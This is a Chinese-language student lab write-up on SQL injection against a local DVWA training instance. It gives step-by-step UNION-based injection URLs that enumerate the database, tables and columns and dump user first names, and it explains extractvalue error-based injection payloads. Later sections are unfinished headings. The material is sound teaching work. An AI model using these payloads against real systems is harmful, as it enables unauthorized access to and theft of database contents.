# 一、分别在前端和后端使用 Union 注入实现“dvwa 数据库 -user 表 - 字段 -first_name 数据”的注入过程，写清楚注入步骤。
## 1. 正常功能描述
![Alt text](image.png)
此处为输入一个id，获取对应用户的 `First name` 和 `Surname`。
## 2. 验证是否存在注入的可能
```text
输入 `1'`
```
![Alt text](image-1.png)   

由此可见，此处可能存在注入点。

## 3. 构造第一个注入语句

```url
http://127.0.0.1:8081/vulnerabilities/sqli/?id=1%27%20union%20all%20select%201,2,3--%20&Submit=Submit#
```
![Alt text](image-2.png)

## 4. 确认后台SQL语句字段的查询数量

```url
http://127.0.0.1:8081/vulnerabilities/sqli/?id=1%27%20union%20all%20select%201,2--%20&Submit=Submit#
```
![Alt text](image-3.png)

## 5. 获取当前数据库名称

```url
http://127.0.0.1:8081/vulnerabilities/sqli/?id=1' union all select database(),2-- &Submit=Submit#
```
![Alt text](image-4.png)   

## 6. 获取当前数据库中的表名

```url
http://127.0.0.1:8081/vulnerabilities/sqli/?id=1' union all select table_name,2 from information_schema.tables where table_schema = database()-- &Submit=Submit#
```
![Alt text](image-5.png)

## 7. 获取目标表（`users`）中的字段
```url
http://127.0.0.1:8081/vulnerabilities/sqli/?id=1' union all select column_name,2 from information_schema.columns where table_name = 'users'-- &Submit=Submit#
```

![Alt text](image-6.png)

## 8. 获取目标字段（`first_name`）的数据
```url
http://127.0.0.1:8081/vulnerabilities/sqli/?id=1' union all select first_name,2 from users-- &Submit=Submit#
```
![Alt text](image-7.png)

# 二、分别在前端和后端使用报错注入实现“dvwa 数据库 -user 表 - 字段”的注入过程，写清楚注入步骤，并回答下列关于报错注入的问题：
## 1. 在 extractvalue 函数中，为什么’~'写在参数 1 的位置不报错，而写在参数 2 的位置报错？
### 1.1 extractvalue 函数介绍
Extractvalue是一个MySQL的函数，它可以用于从XML数据中提取值，并将提取的结果作为一个字符串返回。使用该函数可以解析XML和XPath表达式，并从中提取所需的数据。它的语法如下：   

```sql
extractvalue(xml_document, xpath_expression)
```   

其中`xml_document`是一个XML类型的数据，可以是字符串、XML类型的字段或文档类型的对象。而`xpath_expression`则是要提取的值所在的`XPath`表达式。这个XPath表达式可以是绝对路径，也可以是相对路径。  

`XPath`路径表达式：   

|表达式|描述|
|---|---|
|nodename|选取此节点的所有子节点。|
|/|从根节点选取|
|//|从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置。|
|.|选取当前节点|
|..|选取当前节点的父节点|
|@|选取属性|


下面做个简单的例子：
```sql
select extractvalue('<a><b>aaa</b></a>','/a/b');
```   

![Alt text](image-8.png)   

在第一个参数位构造了一个xml数据，然后第二个参数位指定获取路径`/a/b`下的数据，结果是 `aaa`。

### 1.2 为什么’~'写在参数 1 的位置不报错，而写在参数 2 的位置报错？
根据上面对 `extractvalue` 函数的了解，他的参数 1 的位置可以是字符串，XML类型的字段或文档类型的对象，当 '~' 在参数 1 的位置时，满足字符串的要求，所以并没有什么问题；但是如果将 '~' 放在参数 2 的位置时，'~' 是一个非法的XPath路径表达式字符，所以会报错。

## 2. 报错注入中，为什么要突破单引号的限制，如何突破？
### 2.1 通过后台模拟执行的语句，查看在不做单引号突破的情况的执行结果
```sql
 SELECT first_name, last_name FROM users WHERE user_id = '1' union all select  extractvalue(1,'~database()');
```
![Alt text](image-10.png)   

通过执行结果可以看出，报错信息将 `'~database()'` 部分当做一个字符串来执行了，并没有执行其中的 `database()` 函数。
### 2.2 使用 `concat` 函数，进行拼接的方式，来突破单引号的限制
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' union all select  extractvalue(1,concat('~',database()));
```
![Alt text](image-11.png)   

通过直接结果可以看出，`database()` 函数成功执行，获取到了当前的数据库。
## 3. 在报错注入过程中，为什么要进行报错，是哪种类型的报错？
此问题分为两个部分，一个是为什么要进行报错，另一个是哪种类型的报错。
### 3.1 为什么要进行报错？

### 3.2 哪种类型的报错？
# 三、任选布尔盲注或者时间盲注在前端和后端实现“库名 - 表名 - 列名”的注入过程，写清楚注入步骤。
# 四、利用宽字节注入实现“库名 - 表名 - 列名”的注入过程，写清楚注入步骤。
# 五、利用 SQL 注入实现 DVWA 站点的 Getshell，写清楚攻击步骤。